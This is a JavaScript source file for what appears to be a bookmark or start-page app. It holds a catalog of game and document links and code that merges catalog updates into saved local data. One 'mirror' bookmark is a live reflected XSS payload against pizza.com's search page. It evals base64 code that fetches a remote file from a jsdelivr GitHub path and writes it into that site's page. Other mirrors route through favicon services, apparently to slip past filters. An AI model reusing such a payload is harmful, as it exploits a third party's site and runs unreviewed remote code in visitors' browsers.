          "url": "https://pizza.com/?s=%3Cimg%20src%20onerror=h=eval,h(atob(%27ZmV0Y2goImh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9jcnNocWQvc3R1cmR5LWxhbXBASEVBRC9hcmN0aWMuc3ZnIikudGhlbihmdW5jdGlvbih0KXtyZXR1cm4gdC50ZXh0KCl9KS50aGVuKGZ1bmN0aW9uKHQpe2RvY3VtZW50LndyaXRlKHQpfSk7%27))%3E",
          "icon": "https://www.google.com/s2/favicons?domain=pizza.com&sz=64"
        },
        {
          "id": "sub_arctic_4",
          "title": "Icon Horse Mirror",
          "url": "https://icon.horse/icon/xn--kwhenihadalife-utl6u222y.neocities.org",
          "icon": "https://www.google.com/s2/favicons?domain=icon.horse&sz=64"
        },
        {
          "id": "sub_arctic_5",
          "title": "FaviconAPI Mirror",
          "url": "https://faviconapi.com/vemetric/128/png/xn--kwhenihadalife-utl6u222y.neocities.org",
          "icon": "https://www.google.com/s2/favicons?domain=faviconapi.com&sz=64"
        },
        {
          "id": "sub_arctic_6",
          "title": "GetFavicon Mirror",
          "url": "https://getfavicon.dev/xn--kwhenihadalife-utl6u222y.neocities.org",
          "icon": "https://www.google.com/s2/favicons?domain=getfavicon.dev&sz=64"
        },
        {
          "id": "sub_arctic_7",
          "title": "Favicon IM Mirror",
          "url": "https://a.favicon.im/xn--kwhenihadalife-utl6u222y.neocities.org?larger=true",
          "icon": "https://www.google.com/s2/favicons?domain=a.favicon.im&sz=64"
        },
        {
          "id": "sub_arctic_8",
          "title": "Favicon SO Mirror",
          "url": "https://favicon.so/xn--kwhenihadalife-utl6u222y.neocities.org",
          "icon": "https://www.google.com/s2/favicons?domain=favicon.so&sz=64"
        },
        {
          "id": "sub_arctic_9",
          "title": "KeeWeb Favicon Mirror",
          "url": "https://services.keeweb.info/favicon/xn--kwhenihadalife-utl6u222y.neocities.org",
          "icon": "https://www.google.com/s2/favicons?domain=services.keeweb.info&sz=64"
        },
        {
          "id": "sub_arctic_10",
          "title": "Vemetric Favicon Mirror",
          "url": "https://favicon.vemetric.com/xn--kwhenihadalife-utl6u222y.neocities.org",
          "icon": "https://www.google.com/s2/favicons?domain=favicon.vemetric.com&sz=64"
        },
        {
          "id": "sub_arctic_11",
          "title": "Imgsrc Pub Mirror",
          "url": "https://imgsrc.pub/favicon?url=https://xn--kwhenihadalife-utl6u222y.neocities.org",
          "icon": "https://www.google.com/s2/favicons?domain=imgsrc.pub&sz=64"
        },
        {
          "id": "sub_arctic_myoxy",
          "title": "MyOxyPages Mirror",
          "url": "https://site-sgyfu5dd.myoxypages.com/",
          "icon": "https://www.google.com/s2/favicons?domain=site-sgyfu5dd.myoxypages.com&sz=64"
        },
        {
          "id": "sub_arctic_htmlput",
          "title": "HTMLPut Mirror",
          "url": "https://share.htmlput.com/p/7o9hcsiopd",
          "icon": "https://www.google.com/s2/favicons?domain=share.htmlput.com&sz=64"
        }
      ]
    },
    {
      "id": "bm_pgis2",
      "categoryId": "cat_op_websites",
      "subSectionId": "browser_games",
      "title": "PGIS 2",
      "url": "https://pgis.x10.mx/index.html",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=pgis.x10.mx&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 7,
      "subBookmarks": []
    },
    {
      "id": "bm_ubgdir",
      "categoryId": "cat_op_websites",
      "subSectionId": "docs_games",
      "title": "UBGDir",
      "url": "https://0800webdev.github.io/UBGdir/",
      "type": "bookmark",
      "icon": "/proxy/https://0800webdev.github.io/UBGdir/favicon.png",
      "builtIn": true,
      "hidden": false,
      "order": 0,
      "subBookmarks": []
    },
    {
      "id": "bm_the_wagon",
      "categoryId": "cat_op_websites",
      "subSectionId": "docs_games",
      "title": "The Wagon",
      "url": "https://the-wagonization.github.io/The-Wagon-Site/Pages/Home.html",
      "type": "folder_bookmark",
      "icon": "https://ssl.gstatic.com/docs/documents/images/kix-favicon7.ico",
      "builtIn": true,
      "hidden": false,
      "order": 1,
      "subBookmarks": []
    },
    {
      "id": "bm_ultimate_doc_of_docs",
      "categoryId": "cat_op_websites",
      "subSectionId": "docs_games",
      "title": "Ultimate Doc Of Docs",
      "url": "https://0800webdev.github.io/The-Ultimate-Doc-Of-Docs/",
      "type": "folder_bookmark",
      "icon": "/assets/icons/doc-of-docs-icon.png",
      "builtIn": true,
      "hidden": false,
      "order": 2,
      "subBookmarks": [
        {
          "id": "sub_udod_google_doc",
          "title": "Google Doc Mirror",
          "url": "https://docs.google.com/document/d/1foYnf3pqg00PbEMGnOKmdC0fJsUE_w_lmUZjGTHJtRo/",
          "icon": "https://www.google.com/s2/favicons?domain=docs.google.com&sz=64"
        }
      ]
    },
    {
      "id": "bm_project_19",
      "categoryId": "cat_op_websites",
      "subSectionId": "docs_games",
      "title": "Project 19",
      "url": "https://docs.google.com/document/d/1rlluLiVQc4DGr-kgcoLoF0qb4q1ooTRLj6RPiUxAZCo/",
      "type": "folder_bookmark",
      "icon": "https://ssl.gstatic.com/docs/documents/images/kix-favicon7.ico",
      "builtIn": true,
      "hidden": false,
      "disableQuickSaveWidget": true,
      "order": 3,
      "subBookmarks": []
    },
    {
      "id": "bm_project_idk",
      "categoryId": "cat_op_websites",
      "subSectionId": "docs_games",
      "title": "Project IDK",
      "url": "https://docs.google.com/document/d/1BDRltDqQLuyITBddWOGREhmGnNK8zR-kZ2-mHkkQ9rw/edit?tab=t.0",
      "type": "folder_bookmark",
      "icon": "https://ssl.gstatic.com/docs/documents/images/kix-favicon7.ico",
      "builtIn": true,
      "hidden": false,
      "disableQuickSaveWidget": true,
      "order": 4,
      "subBookmarks": []
    },
    {
      "id": "bm_budsin_games",
      "categoryId": "cat_games",
      "subSectionId": "builtin",
      "title": "Budsin Games",
      "url": "https://games.budsin.dev/#/",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=games.budsin.dev&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 23,
      "subBookmarks": []
    }
  ]
};

  // Resolve historical omitted placement once in the canonical source.
  defaults.bookmarks.forEach(function(item){if(!item.subSectionId)item.subSectionId=item.builtIn?'builtin':'user';});

  // The small reviewed order manifest is the editor's repository-compatible source.
  // Content stays here; generated bridge changes default layout only, never saved data.
  seedPicks(defaults,publishedPicks);
  applyOfficialOrder(defaults, officialOrder);
  var release = { version: officialOrder.catalogVersion, date: '2026-10-31', summary: 'Heavenly Arcade and shared Collections keep your personal games, favorites and launch choices. GN Math appears above SitesDotCom in official order.', data: defaults };
  var key = 'heavenly_bookmarks';
  var fields = ['title', 'description', 'url', 'icon', 'type', 'categoryId', 'subSectionId', 'side', 'defaultCollapsed', 'disableQuickSaveWidget', 'mirrorEligible', 'order'];
  var personal = ['categoryId', 'subSectionId', 'side', 'disableQuickSaveWidget', 'order'];
  function clone(value) { return JSON.parse(JSON.stringify(value)); }
  function equal(a, b) { return JSON.stringify(a) === JSON.stringify(b); }
  // Reviewed Picks feed the same official release and review machinery. Existing
  // destinations are references; new recommendations become stable official items.
  function seedPicks(data,picks){
    var existing=Object.create(null),urls=Object.create(null),seen=new Set();
    function scan(items){(items||[]).forEach(function(e){existing[e.id]=e;var k=navigation.bookmarkKey(e.url);if(k)urls[k]=e;scan(e.subBookmarks);});}scan(data.bookmarks);
    (picks&&picks.items||[]).forEach(function(p){
      if(!p||p.enabled!==true)return;
      var url;try{url=new URL(p.url);}catch(_){throw new Error('A published Pick has an invalid destination.');}
      if(!/^https?:$/.test(url.protocol)||url.username||url.password||typeof p.id!=='string'||!/^[a-z][a-z0-9_:-]{0,119}$/i.test(p.id)||['constructor','prototype'].includes(p.id)||typeof p.title!=='string'||!p.title.trim()||seen.has(p.id))throw new Error('A published Pick needs a safe URL and a unique stable identity.');
      seen.add(p.id);var key=navigation.bookmarkKey(url.href);
      if(existing[p.id]&&navigation.bookmarkKey(existing[p.id].url)!==key)throw new Error('A published Pick conflicts with an existing catalog identity.');
      if(existing[p.id]||urls[key])return;
      var item={id:p.id,title:p.title,url:url.href,description:typeof p.description==='string'?p.description:'',icon:p.icon||'preset:gamepad',categoryId:'cat_games',subSectionId:'builtin',type:'bookmark',builtIn:true,hidden:false,order:10000+(Number(p.order)||0),catalogSource:'picks'};
      data.bookmarks.push(item);existing[item.id]=item;urls[key]=item;
    });return data;
  }
  function applyOfficialOrder(data, manifest) {
    function fail() { throw new Error('The reviewed official ordering is invalid. Rebuild its bridge before publishing.'); }
    if (!manifest || manifest.schema !== 1 || typeof manifest.catalogVersion !== 'string' || !manifest.catalogVersion || !Array.isArray(manifest.categories) || !Array.isArray(manifest.bookmarks)) fail();
    var original = records(data), seen = Object.create(null), slots = Object.create(null), entries = Object.create(null), layout = Object.create(null);
    function order(value, group) {
      if (!Number.isSafeInteger(value) || value < 0 || slots[group + ':' + value]) fail();
      slots[group + ':' + value] = true;
    }
    function identity(key) { if (!original[key] || seen[key]) fail(); seen[key] = true; }
    manifest.categories.forEach(function (cat) {
      identity('category:' + cat.id);
      if (['left', 'right', 'bottom'].indexOf(cat.side) === -1 || !Array.isArray(cat.subSections)) fail();
      order(cat.order, 'side:' + cat.side);
      cat.subSections.forEach(function (section) { identity('section:' + cat.id + ':' + section.id); order(section.order, 'sections:' + cat.id); });
    });
    function collect(items) { items.forEach(function (item) { entries[item.id] = item; collect(item.subBookmarks || []); }); }
    collect(data.bookmarks);
    manifest.bookmarks.forEach(function (item) {
      identity('bookmark:' + item.id);
      if (item.parentId !== null && typeof item.parentId !== 'string') fail();
      // The workshop supports ranking nested links within their existing folder.
      // Validate that same boundary here before a candidate bridge can redefine
      // the model's expected tree during repository generation.
      if (original['bookmark:' + item.id].parent !== item.parentId) fail();
      if (!seen['category:' + item.categoryId] || !seen['section:' + item.categoryId + ':' + item.subSectionId]) fail();
      var parent = item.parentId && entries[item.parentId];
      if (item.parentId && (!parent || parent.id === item.id || !((parent.type === 'folder' || parent.type === 'folder_bookmark') || (parent.subBookmarks || []).length))) fail();
      order(item.order, item.parentId ? 'children:' + item.parentId : 'bookmarks:' + item.categoryId + ':' + item.subSectionId);
      layout[item.id] = item;
    });
    var extraPicks=Object.keys(original).filter(function(key){return !seen[key]&&original[key].kind==='bookmark'&&!original[key].parent&&original[key].value.catalogSource==='picks';}).map(function(key){return entries[original[key].value.id];});
    if (Object.keys(seen).length+extraPicks.length !== Object.keys(original).length) fail();
    manifest.bookmarks.forEach(function (item) {
      var visited = {}, current = item;
      while (current.parentId) {
        if (visited[current.id] || !layout[current.parentId]) fail();
        visited[current.id] = true;
        var ancestor = layout[current.parentId];
        if (current.categoryId !== ancestor.categoryId || current.subSectionId !== ancestor.subSectionId) fail();
        current = ancestor;
      }
    });
    manifest.categories.forEach(function (cat) {
      var target = data.categories.find(function (c) { return c.id === cat.id; });
      target.side = cat.side; target.order = cat.order;
      cat.subSections.forEach(function (section) { target.subSections.find(function (s) { return s.id === section.id; }).order = section.order; });
      target.subSections.sort(function (a, b) { return a.order - b.order; });
    });
    Object.keys(entries).forEach(function (id) { entries[id].subBookmarks = []; });
    data.bookmarks = [];
    manifest.bookmarks.slice().sort(function (a, b) { return a.order - b.order; }).forEach(function (item) {
      var target = entries[item.id]; target.order = item.order;
      if (item.parentId) {
        delete target.categoryId; delete target.subSectionId;
        entries[item.parentId].subBookmarks.push(target);
      } else {
        target.categoryId = item.categoryId; target.subSectionId = item.subSectionId;
        data.bookmarks.push(target);
      }
    });
    extraPicks.forEach(function(item){item.order=Math.max(-1,...data.bookmarks.filter(function(e){return e.categoryId==='cat_games'&&e.subSectionId==='builtin';}).map(function(e){return Number(e.order)||0;}))+1;data.bookmarks.push(item);});
    return data;
  }
  function validate(data, allowLegacy) {
    if (!data || !Array.isArray(data.categories) || !Array.isArray(data.bookmarks)) throw new Error('The saved bookmark collection is invalid. Export a backup before repairing it.');
    var ids = Object.create(null);
    function id(value, prefix) {
      if (!value || typeof value !== 'object' || Array.isArray(value) || typeof value.id !== 'string' || !value.id || ids[prefix + value.id]) throw new Error('The bookmark collection contains missing or duplicate identities.');
      ids[prefix + value.id] = true;
    }
    data.categories.forEach(function (cat) {
      id(cat, 'category:');
      if (cat.subSections !== undefined && !Array.isArray(cat.subSections)) throw new Error('Invalid bookmark sections.');
      (cat.subSections || []).forEach(function (section) { id(section, 'section:' + cat.id + ':'); });
    });
    function entries(items, nested) { items.forEach(function (item) { if (!(allowLegacy && nested && item && !item.id && typeof item.url === 'string' && item.url)) id(item, 'bookmark:'); if (item.subBookmarks !== undefined && !Array.isArray(item.subBookmarks)) throw new Error('Invalid nested bookmarks.'); entries(item.subBookmarks || [], true); }); }
    entries(data.bookmarks, false);
    return data;
  }
  function records(data) {
    var result = Object.create(null);
    function record(kind, item, parent) {
      var value = clone(item); delete value.subBookmarks; delete value.subSections;
      var identity = kind === 'section' ? kind + ':' + parent + ':' + item.id : kind + ':' + item.id;
      result[identity] = { key: identity, kind: kind, parent: parent || null, value: value };
    }
    data.categories.forEach(function (cat) { record('category', cat); (cat.subSections || []).forEach(function (s) { record('section', s, cat.id); }); });
    function walk(items, parent) { items.forEach(function (item) { record('bookmark', item, parent); walk(item.subBookmarks || [], item.id); }); }
    walk(data.bookmarks, null);
    return result;
  }
  function signature(record) {
    if (!record || !record.value) return null;
    var value = { parent: record.parent };
    fields.forEach(function (field) { if (record.value[field] !== undefined) value[field] = record.value[field]; });
    return value;
  }
  function stamp(value) {
    var str = JSON.stringify(value), hash = 2166136261;
    for (var i = 0; i < str.length; i++) { hash ^= str.charCodeAt(i); hash = Math.imul(hash, 16777619); }
    return (hash >>> 0).toString(16);
  }
  function metadata(data, bundled) {
    function object(value) { return value && typeof value === 'object' && !Array.isArray(value); }
    function snapshot(value) {
      return object(value) && Object.keys(value).every(function(identity){
        var record=value[identity];
        if(!object(record)||!object(record.value)||typeof record.value.id!=='string')return false;
        var expected=record.kind==='section'?'section:'+record.parent+':'+record.value.id:record.kind+':'+record.value.id;
        return ['category','section','bookmark'].indexOf(record.kind)!==-1 && record.key===identity && expected===identity;
      });
    }
    var saved=data._catalog;
    if (saved && saved.schema===1 && snapshot(saved.base) && snapshot(saved.accepted) && Array.isArray(saved.installed) && saved.installed.every(function(id){return typeof id==='string';}) && object(saved.decisions) && object(saved.tombstones)) return saved;
    // Legacy adoption records only identities already present. Missing defaults are
    // reviewable catch-up additions, never automatically imported on an old device.
    var existing = records(data), official = records(bundled.data), base = {}, accepted = {};
    Object.keys(official).forEach(function (identity) { if (existing[identity]) { base[identity] = clone(official[identity]); accepted[identity] = clone(official[identity]); } });
    data._catalog = { schema: 1, version: null, base: base, accepted: accepted, installed: Object.keys(base), tombstones: {}, decisions: {}, conflicts: [] };
    return data._catalog;
  }
  function migrateLegacyIds(data, bundled) {
    var used=Object.create(null), official=records(bundled.data);
    function collect(items){items.forEach(function(item){if(item.id)used[item.id]=true;collect(item.subBookmarks||[]);});}
    collect(data.bookmarks);
    function children(parent){
      var aliases=Object.create(null);
      (parent.subBookmarks||[]).forEach(function(child){
        if(!child.id){
          var url=navigation.bookmarkKey(child.url), match=Object.keys(official).map(function(key){return official[key];}).find(function(record){return record.kind==='bookmark'&&record.parent===parent.id&&!child.isUser&&navigation.bookmarkKey(record.value.url)===url&&!used[record.value.id];});
          var identity=match?match.value.id:'legacy_'+stamp([parent.id,url]), suffix=0, initial=identity;
          while(used[identity])identity=initial+'_'+(++suffix);
          child.id=identity;used[identity]=true;
          if(!aliases['url:'+url])aliases['url:'+url]='id:'+identity;
        }
        children(child);
      });
      var preferences=parent.mirrorPreferences;
      if(preferences&&typeof preferences==='object'){
        ['active','preferred'].forEach(function(field){if(aliases[preferences[field]])preferences[field]=aliases[preferences[field]];});
        if(Array.isArray(preferences.order))preferences.order=preferences.order.map(function(identity){return aliases[identity]||identity;});
      }
    }
    data.bookmarks.forEach(children);
  }
  function compatible(data, bundled) {
    // Structural compatibility is independent of optional content decisions.
    var canonical = records(bundled.data);
    data.categories.forEach(function (cat) { if (!cat.subSections) cat.subSections = [{ id:'builtin', title:'Built-In', builtIn:true }, { id:'user', title:'Your Bookmarks', builtIn:true }]; });
    data.bookmarks.forEach(function (item) {
      if (!item.subSectionId) { var def = canonical['bookmark:' + item.id]; var cat = data.categories.find(function (c) { return c.id === item.categoryId; }); item.subSectionId = def && def.value.categoryId === item.categoryId ? (def.value.subSectionId || (def.value.builtIn ? 'builtin' : 'user')) : (item.builtIn ? 'builtin' : 'user'); if (cat && !cat.subSections.some(function (s) { return s.id === item.subSectionId; })) { if(!cat.subSections.length)cat.subSections.push({id:'user',title:'Your Bookmarks',builtIn:false}); item.subSectionId = cat.subSections.some(function(s){return s.id==='user';}) ? 'user' : cat.subSections[0].id; } }
    });
    navigation.migrateBookmarkIcons(data);
    return data;
  }
  // Identity-specific compatibility repair. This must run even after Skip, but it
  // must never add optional catalog content or deduplicate a visitor's URLs.
  function consolidateNewgrounds(data, meta, bundled) {
    if (!records(bundled.data)['bookmark:bm_ng']) return;
    var oldKey = 'bookmark:bm_user_ng', canonicalKey = 'bookmark:bm_ng';
    var normal = findItem(data, oldKey), canonical = findItem(data, canonicalKey);
    if (!normal && !canonical) return;
    function knownTitle(value) { return value === 'Newgrounds' || value === 'Newgrounds: Syshi'; }
    function legacyDefault(item, field) {
      var legacy = { categoryId:'cat_games', subSectionId:item.id === 'bm_user_ng' ? 'user' : 'builtin', order:item.id === 'bm_user_ng' ? 99 : 1,
        title:item.id === 'bm_user_ng' ? 'Newgrounds' : 'Newgrounds: Syshi', url:'https://newgrounds.com', type:'folder_bookmark',
        icon:'https://www.google.com/s2/favicons?domain=newgrounds.com&sz=64', hidden:false };
      return item[field] === undefined || equal(item[field], legacy[field]) || field === 'title' && knownTitle(item[field]);
    }
    // Missing subsection metadata on very old normal records means Your Bookmarks.
    // compatible() cannot infer this after we promote its identity.
    if (normal && !normal.subSectionId) normal.subSectionId = 'user';
    if (normal) {
      meta.migrations = meta.migrations && typeof meta.migrations === 'object' && !Array.isArray(meta.migrations) ? meta.migrations : {};
      var migration = meta.migrations.newgrounds;
      if (!migration || migration.schema !== 1 || !Array.isArray(migration.originals)) migration = meta.migrations.newgrounds = { schema:1, canonicalId:'bm_ng', retiredId:'bm_user_ng', originals:[], conflicts:[] };
      // Full original records make conflicting icons, launch choices and long notes
      // recoverable from the local popup and private backup, without public sharing.
      [canonical, normal].filter(Boolean).forEach(function (item) {
        var original = clone(item), fingerprint = stamp(original);
        if (!migration.originals.some(function (saved) { return saved.fingerprint === fingerprint && equal(saved.record, original); })) migration.originals.push({ fingerprint:fingerprint, record:original });
      });
      if (!canonical) {
        canonical = normal; canonical.id = 'bm_ng';
      } else {
        function conflict(field) {
          if (migration.conflicts.indexOf(field) === -1) migration.conflicts.push(field);
        }
        var canonicalMoved = !legacyDefault(canonical, 'categoryId') || !legacyDefault(canonical, 'subSectionId');
        var normalMoved = !legacyDefault(normal, 'categoryId') || !legacyDefault(normal, 'subSectionId');
        if (!canonicalMoved && normalMoved) {
          canonical.categoryId = normal.categoryId; canonical.subSectionId = normal.subSectionId; canonical.order = normal.order;
        } else if (!canonicalMoved && !normalMoved && legacyDefault(canonical, 'order') && !legacyDefault(normal, 'order')) {
          canonical.categoryId = normal.categoryId; canonical.subSectionId = normal.subSectionId; canonical.order = normal.order;
        } else if ((canonicalMoved || !legacyDefault(canonical, 'order')) && (normalMoved || !legacyDefault(normal, 'order')) &&
            (!equal(canonical.categoryId, normal.categoryId) || !equal(canonical.subSectionId, normal.subSectionId) || !equal(canonical.order, normal.order))) conflict('position');
        canonical.hidden = !!(canonical.hidden || normal.hidden);
        var aNote = typeof canonical.personalNote === 'string' ? canonical.personalNote : '', bNote = typeof normal.personalNote === 'string' ? normal.personalNote : '';
        if (bNote && bNote !== aNote) canonical.personalNote = aNote ? aNote + '\n\n— Saved from Newgrounds —\n' + bNote : bNote;
        Object.keys(normal).forEach(function (field) {
          if (['id','builtIn','hidden','personalNote','subBookmarks','mirrorPreferences','categoryId','subSectionId','order','__proto__','constructor','prototype'].indexOf(field) !== -1) return;
          if (canonical[field] === undefined || legacyDefault(canonical, field) && !legacyDefault(normal, field)) canonical[field] = clone(normal[field]);
          else if (!legacyDefault(normal, field) && !equal(canonical[field], normal[field])) conflict(field);
        });
        function locate(items, target) {
          for (var i = 0; i < items.length; i++) {
            if (items[i] === target) return { items:items, index:i };
            var found = locate(items[i].subBookmarks || [], target);
            if (found) return found;
          }
          return null;
        }
        // A visitor can nest either legacy identity inside the other. Detach
        // before merging their children so no canonical record is removed with
        // its ancestor, and no self-referencing tree can be created.
        var nestedCanonical = locate(normal.subBookmarks || [], canonical);
        var normalLocation = locate(data.bookmarks, normal);
        if (nestedCanonical) {
          nestedCanonical.items.splice(nestedCanonical.index, 1);
          normalLocation.items[normalLocation.index] = canonical;
          ['categoryId','subSectionId','order'].forEach(function (field) {
            if (normal[field] !== undefined) canonical[field] = clone(normal[field]);
          });
          conflict('nestedPlacement');
        } else normalLocation.items.splice(normalLocation.index, 1);
        canonical.subBookmarks = (canonical.subBookmarks || []).concat(normal.subBookmarks || []);
        var aPrefs = canonical.mirrorPreferences, bPrefs = normal.mirrorPreferences;
        if (bPrefs && typeof bPrefs === 'object' && !Array.isArray(bPrefs)) {
          if (!aPrefs || typeof aPrefs !== 'object' || Array.isArray(aPrefs)) canonical.mirrorPreferences = clone(bPrefs);
          else {
            Object.keys(bPrefs).forEach(function (field) {
              if (field === 'order' && Array.isArray(bPrefs.order)) {
                aPrefs.order = (Array.isArray(aPrefs.order) ? aPrefs.order : []).concat(bPrefs.order).filter(function (id, index, all) { return all.indexOf(id) === index; });
              } else if (aPrefs[field] === undefined) aPrefs[field] = clone(bPrefs[field]);
              else if (!equal(aPrefs[field], bPrefs[field])) conflict('mirrorPreferences.' + field);
            });
          }
        }
      }
      delete meta.base[oldKey]; delete meta.accepted[oldKey];
      meta.installed = meta.installed.filter(function (key) { return key !== oldKey; });
      meta.tombstones[oldKey] = true;
      migration.conflicts.forEach(function (field) {
        if (!(meta.conflicts || []).some(function (c) { return c.key === canonicalKey && c.field === field && c.migration === 'newgrounds'; })) {
          if (!Array.isArray(meta.conflicts)) meta.conflicts = [];
          meta.conflicts.push({ key:canonicalKey, title:'Newgrounds', field:field, migration:'newgrounds', message:field === 'nestedPlacement' ? 'Moved Newgrounds into its retired containing bookmark’s slot to preserve every saved link; both originals remain available in Saved links & recovery.' : 'Kept the existing ' + field + '; both originals remain available in Saved links & recovery.' });
        }
      });
    }
    if (knownTitle(canonical.title)) canonical.title = 'Newgrounds';
    canonical.builtIn = true;
    return data;
  }
  function prepare(data, bundled) {
    bundled = bundled || release; validate(bundled.data); validate(data, true);
    migrateLegacyIds(data, bundled); validate(data);
    compatible(data, bundled);
    var meta = metadata(data, bundled);
    consolidateNewgrounds(data, meta, bundled);
    var present = records(data);
    meta.installed.forEach(function (identity) { if (!present[identity]) meta.tombstones[identity] = true; });
    return data;
  }
  function fresh(bundled) {
    bundled = bundled || release;
    var data = clone(bundled.data), official = records(data);
    data._catalog = { schema:1, version:bundled.version, base:clone(official), accepted:clone(official), installed:Object.keys(official), tombstones:{}, decisions:{}, conflicts:[] };
    return validate(data);
  }
  function pending(data, bundled) {
    bundled = bundled || release;
    data = prepare(clone(data), bundled);
    var meta = data._catalog, next = records(bundled.data), changes = [];
    Object.keys(next).concat(Object.keys(meta.base).filter(function (id) { return !next[id]; })).forEach(function (identity) {
      var before = meta.base[identity], after = next[identity];
      if (equal(signature(before), signature(after))) return;
      var change = { key:identity, kind:after ? before ? 'updated' : 'added' : 'removed', before:before || null, after:after || null };
      if (before && after) {
        var oldContent = signature(before), newContent = signature(after);
        ['parent','order','side','categoryId','subSectionId'].forEach(function (field) { delete oldContent[field]; delete newContent[field]; });
        change.layoutOnly = equal(oldContent, newContent);
      }
      change.id = identity + ':' + stamp([signature(before), signature(after)]);
      if (meta.tombstones[identity]) return;
      changes.push(change);
    });
    // A new child in a previously skipped container must disclose the minimal
    // parent dependency too. Other skipped siblings stay skipped.
    var existing = records(data), included = {};
    changes.forEach(function(c){included[c.key]=true;});
    function dependency(identity) {
      if (!identity || existing[identity] || included[identity] || meta.tombstones[identity] || !next[identity]) return;
      var record=next[identity];
      dependency(record.kind==='section'?'category:'+record.parent:record.parent?'bookmark:'+record.parent:record.kind==='bookmark'?'section:'+record.value.categoryId+':'+record.value.subSectionId:null);
      var c={key:identity,kind:'added',before:meta.base[identity]||null,after:record,dependency:true};c.id=identity+':'+stamp([signature(c.before),signature(record),'dependency']);included[identity]=true;changes.unshift(c);
    }
    changes.slice().forEach(function(c){if(!c.after)return;var r=c.after;dependency(r.kind==='section'?'category:'+r.parent:r.parent?'bookmark:'+r.parent:r.kind==='bookmark'?'section:'+r.value.categoryId+':'+r.value.subSectionId:null);});
    // Canonical traversal is parents before children, including dependencies.
    var order=Object.keys(next);changes.sort(function(a,b){return order.indexOf(a.key)-order.indexOf(b.key);});
    return { version:bundled.version, date:bundled.date, summary:bundled.summary, changes:changes, fingerprint:stamp(changes.map(function (c) { return c.id; })) };
  }
  function appendOrder(items, match) { return items.reduce(function (max, item) { return match(item) ? Math.max(max, Number(item.order) || 0) : max; }, -1) + 1; }
  function findItem(data, identity) {
    if (identity.indexOf('category:') === 0) return data.categories.find(function (c) { return 'category:' + c.id === identity; }) || null;
    if (identity.indexOf('section:') === 0) {
      for (var index = 0; index < data.categories.length; index++) {
        var category = data.categories[index], section = (category.subSections || []).find(function (s) { return 'section:' + category.id + ':' + s.id === identity; });
        if (section) return section;
      }
      return null;
    }
    if (identity.indexOf('bookmark:') !== 0) return null;
    var id = identity.slice('bookmark:'.length);
    function find(items) { for (var i=0;i<items.length;i++) { if (items[i].id === id) return items[i]; var child=find(items[i].subBookmarks || []); if(child)return child; } return null; }
    return find(data.bookmarks);
  }
  function merge(data, bundled, decision) {
    bundled = bundled || release; data = prepare(clone(data), bundled);
    var review = pending(data, bundled), meta = data._catalog, next = records(bundled.data);
    if (!review.changes.length) return data;
    meta.conflicts = (meta.conflicts || []).filter(function (conflict) { return !!conflict.migration; });
    review.changes.forEach(function (change) {
      var record = change.after || change.before, item = findItem(data, change.key);
      meta.decisions[change.id] = decision;
      if (decision !== 'applied') return;
      if (!change.after) { if (item) item.catalogRetired = true; delete meta.accepted[change.key]; return; }
      if (!item) {
        item = clone(record.value);
        if (record.kind === 'category') { item.subSections = []; item.order = appendOrder(data.categories, function (c) { return c.side === item.side; }); data.categories.push(item); }
        else if (record.kind === 'section') {
          var category = data.categories.find(function (c) { return c.id === record.parent; });
          if (!category) { meta.conflicts.push({key:change.key, title:item.title, message:'Its original category was removed; restore that category to install this section.'}); return; }
          category.subSections.push(item);
        } else if (record.parent) {
          var parent = findItem(data, 'bookmark:' + record.parent);
          if (!parent) { meta.conflicts.push({key:change.key, title:item.title, message:'Its original folder was removed; this link was left uninstalled.'}); return; }
          if (!parent.subBookmarks) parent.subBookmarks = [];
          item.order = appendOrder(parent.subBookmarks, function () { return true; }); parent.subBookmarks.push(item);
        } else {
          var cat = data.categories.find(function (c) { return c.id === item.categoryId; });
          if (!cat) { meta.conflicts.push({key:change.key, title:item.title, message:'Its original category was removed; this bookmark was left uninstalled.'}); return; }
          if (!cat.subSections.some(function (s) { return s.id === item.subSectionId; })) item.subSectionId = cat.subSections.some(function (s) { return s.id === 'user'; }) ? 'user' : cat.subSections[0] && cat.subSections[0].id;
          // Preserve Coolmath's historical URL deduplication; all normal identity
          // matching uses stable IDs, never mutable titles or URLs.
          if (item.id === 'bm_coolmath' && navigation.findBookmarkByUrl(data, item.url)) return;
          var section = item.subSectionId;
          item = navigation.prepareMissingBookmark(data, item); item.subSectionId = section;
          if (item.id !== 'bm_coolmath') item.order = appendOrder(data.bookmarks, function (b) { return b.categoryId === item.categoryId && b.subSectionId === item.subSectionId; });
          data.bookmarks.push(item);
        }
      } else {
        var previous = meta.accepted[change.key] || change.before;
        fields.forEach(function (field) {
          if (personal.indexOf(field) !== -1 || equal(previous && previous.value[field], record.value[field])) return;
          if (item[field] === undefined || equal(item[field], previous && previous.value[field])) {
            if (field === 'url' && item.url && item.url !== record.value.url) item.catalogPreviousUrls = (item.catalogPreviousUrls || []).concat([item.url]).filter(function(url,index,all){return all.indexOf(url)===index;});
            if (record.value[field] === undefined) delete item[field]; else item[field] = clone(record.value[field]);
          } else if (!equal(item[field], record.value[field])) meta.conflicts.push({key:change.key, title:item.title, field:field, message:'Kept your customized ' + field + '.'});
        });
        delete item.catalogRetired;
      }
      meta.accepted[change.key] = clone(record);
    });
    meta.base = clone(next); meta.version = bundled.version; meta.lastDecision = decision;
    meta.installed = meta.installed.concat(Object.keys(next).filter(function (identity) { return !!findItem(data, identity); })).filter(function(identity,index,all){return all.indexOf(identity)===index;});
    validate(data);
    return data;
  }
  function load(storage, bundled) {
    bundled = bundled || release;
    var raw = storage.getItem(key), data = raw === null ? fresh(bundled) : prepare(JSON.parse(raw), bundled);
    if(collections) data=collections.prepare(data);
    var serialized = JSON.stringify(data);
    if (raw !== serialized) storage.setItem(key, serialized);
    return data;
  }
  function commit(storage, decision, expected, bundled) {
    bundled = bundled || release;
    if (decision !== 'applied' && decision !== 'skipped') throw new Error('Unknown catalog decision.');
    var raw = storage.getItem(key);
    if (raw === null) throw new Error('The collection changed. Reopen Bookmark Updates.');
    var data = prepare(JSON.parse(raw), bundled), review = pending(data, bundled);
    if (expected && expected !== review.fingerprint) throw new Error('The available updates changed. Reopen Bookmark Updates to review them.');
    var result = merge(data, bundled, decision);
    // One localStorage write commits the collection and review decision together.
    // A quota/access failure leaves the original value intact.
    storage.setItem(key, JSON.stringify(result));
    return result;
  }
  function imported(data, source, complete, bundled) {
